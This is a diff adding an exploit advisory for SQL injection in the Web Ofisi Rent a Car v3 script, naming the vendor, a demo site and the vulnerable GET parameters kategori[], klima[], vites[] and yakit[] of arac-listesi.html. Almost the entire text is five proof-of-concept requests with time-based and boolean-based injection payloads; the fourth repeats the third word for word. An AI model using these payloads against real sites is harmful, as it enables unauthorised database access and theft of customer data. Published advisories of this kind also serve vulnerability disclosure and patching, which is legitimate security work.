@@ -1,0 +1,43 @@
+# Exploit Title: Web Ofisi Rent a Car 3 - 'klima' SQL Injection
+# Date: 2019-07-19
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor: https://www.web-ofisi.com/detay/rent-a-car-v3.html
+# Demo Site: http://demobul.net/rentacarv3/
+# Version: v3
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request:
+http://localhost/[PATH]/arac-listesi.html?kategori[]=0&klima[]=1&vites[]=1&yakit[]=1
+Vulnerable Parameter: kategori[] (GET)
+Payload: if(now()=sysdate(),sleep(0),0)
+
+----- PoC 2: SQLi -----
+
+Request:
+http://localhost/[PATH]/arac-listesi.html?kategori[]=i0&klima[]=1&vites[]=1&yakit[]=1
+Vulnerable Parameter: klima[] (GET)
+Payload: 1 AND 3*2*1=6 AND 695=695
+
+----- PoC 3: SQLi -----
+
+Request:
+http://localhost/[PATH]/arac-listesi.html?kategori[]=i0&klima[]=1&vites[]=1&yakit[]=1
+Vulnerable Parameter: vites[] (GET)
+Payload: 1 AND 3*2*1=6 AND 499=499
+
+----- PoC 4: SQLi -----
+
+Request:
+http://localhost/[PATH]/arac-listesi.html?kategori[]=i0&klima[]=1&vites[]=1&yakit[]=1
+Vulnerable Parameter: vites[] (GET)
+Payload: 1 AND 3*2*1=6 AND 499=499
+
+----- PoC 5: SQLi -----
+
+Request:
+http://localhost/[PATH]/arac-listesi.html?kategori[]=i0&klima[]=1&vites[]=1&yakit[]=1
+Vulnerable Parameter: yakit[] (GET)
+Payload: 1 AND 3*2*1=6 AND 602=602
